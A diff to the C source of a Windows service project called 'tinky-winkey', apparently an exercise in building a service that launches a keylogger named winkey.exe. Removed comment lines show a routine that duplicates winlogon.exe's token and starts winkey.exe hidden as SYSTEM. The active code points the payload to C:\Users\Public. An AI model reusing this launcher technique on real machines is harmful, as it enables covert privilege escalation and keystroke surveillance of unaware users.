@@ -1,7 +1,5 @@
 #include "tinky.h"
 
-
-
 SC_HANDLE               scmH;
 SC_HANDLE               serviceH;
 SERVICE_STATUS_HANDLE   g_StatusHandle;
@@ -29,7 +27,7 @@ int OpenSvc() {
     serviceH = OpenService(
         scmH,       // SCM database 
         SVCNAME,    // name of service 
-        GENERIC_ALL      // need delete access 
+        GENERIC_ALL 
     );
 
     if (serviceH == NULL)
@@ -169,60 +167,31 @@ int main(int argc, CHAR **argv)
     }
 }
 
-
 DWORD GetPidByName(char* filename)
 {
     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
     PROCESSENTRY32 pEntry;
-    PROCESSENTRY32 ptemp[5];
     pEntry.dwSize = sizeof(PROCESSENTRY32);
     BOOL hRes = Process32First(hSnapShot, &pEntry);
-    int i = 0;
     while (hRes)
     {
         if (strcmp(pEntry.szExeFile, filename) == 0)
         {
-            ptemp[i] = pEntry;
-            i++;
-            //CloseHandle(hSnapShot);
+            CloseHandle(hSnapShot);
+            return(pEntry.th32ProcessID);
         }
         hRes = Process32Next(hSnapShot, &pEntry);
     }
     CloseHandle(hSnapShot);
-    return(ptemp[i-1].th32ProcessID);
-    //return(0);
+    return(0);
 }
-
-//void    Tinky_Winky() {
-//    DWORD winlogonPID;
-//    HANDLE wlPH;
-//    HANDLE wlTH;
-//    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
-//
-//    winlogonPID = GetPidByName("winlogon.exe");
-//    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
-//    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
-//        printf("opt\n");
-//    }
-//    CloseHandle(wlPH);
-//    if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
-//        printf("dtEx\n");
-//    }
-//    CloseHandle(wlTH);
-//
-//    /*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
-//        printf("cpwt (%ld)\n", GetLastError());
-//    }*/
-//    if (!CreateProcessAsUserW(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &winkeyPI)) {
-//        printf("cpwt (%ld)\n", GetLastError());
-//    }
-//}
 
 void    Tinky_Winky() {
     DWORD winlogonPID;
     HANDLE wlPH;
     HANDLE wlTH;
-    char* deb = "C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+
+    char* deb = "C:\\Users\\Public\\winkey.exe";
     LPCSTR PP = deb;
     STARTUPINFO Si;
 
@@ -260,35 +229,6 @@ void    Tinky_Winky_Die() {
     CloseHandle(wkPH);
 }
 
-//VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv)
-//{
-//    // Register the handler function for the service
-//
-//    gSvcStatusHandle = RegisterServiceCtrlHandler(
-//        SVCNAME,
-//        SvcCtrlHandler);
-//
-//    if (!gSvcStatusHandle)
-//    {
-//        SvcReportEvent(TEXT("RegisterServiceCtrlHandler"));
-//        return;
-//    }
-//
-//    // These SERVICE_STATUS members remain as set here
-//
-//    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-//    gSvcStatus.dwServiceSpecificExitCode = 0;
-//
-//    // Report initial status to the SCM
-//
-//    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
-//
-//    // Perform service-specific initialization and work.
-//
-//    SvcInit(dwArgc, lpszArgv);
-//}
-
-//LPSERVICE_MAIN_FUNCTIONA ServiceMain()
 
 VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
     if (dwArgc && lpszArgv[dwArgc]) {
